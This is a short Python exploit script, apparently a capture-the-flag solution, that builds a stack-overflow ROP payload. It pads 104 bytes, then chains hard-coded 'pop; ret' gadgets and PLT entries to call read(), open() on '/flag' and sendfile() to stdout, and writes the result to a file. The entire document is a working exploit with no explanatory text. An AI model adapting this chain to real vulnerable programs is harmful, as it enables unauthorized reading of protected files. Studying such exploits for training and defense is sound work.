#!/usr/bin/env python3

from struct import pack

payload = b'a' * 104

# 0x404040 is the address of a global variable.
# read(0, 0x404050, 5);
payload += pack("<Q", 0x40177f) # pop rdi ; ret
payload += pack("<Q", 0)        # data
payload += pack("<Q", 0x401787) # pop rsi ; ret
payload += pack("<Q", 0x404050) # data
payload += pack("<Q", 0x401797) # pop rdx ; ret
payload += pack("<Q", 5)        # data
payload += pack("<Q", 0x4010a0) # <read@plt>

# open("/flag", 0);  // 0 is O_RDONLY.
payload += pack("<Q", 0x40177f) # pop rdi ; ret
payload += pack("<Q", 0x404050) # data
payload += pack("<Q", 0x401787) # pop rsi ; ret
payload += pack("<Q", 0)        # data
payload += pack("<Q", 0x4010c0) # <open@plt>

# sendfile(1, 3, 0, 400);
payload += pack("<Q", 0x40177f) # pop rdi ; ret
payload += pack("<Q", 1)        # data
payload += pack("<Q", 0x401787) # pop rsi ; ret
payload += pack("<Q", 3)        # data
payload += pack("<Q", 0x401797) # pop rdx ; ret
payload += pack("<Q", 0)        # data
payload += pack("<Q", 0x40178f) # pop rcx ; ret
payload += pack("<Q", 400)      # data
payload += pack("<Q", 0x4010b0) # <sendfile@plt>

with open("payload", "wb") as f:
    f.write(payload)
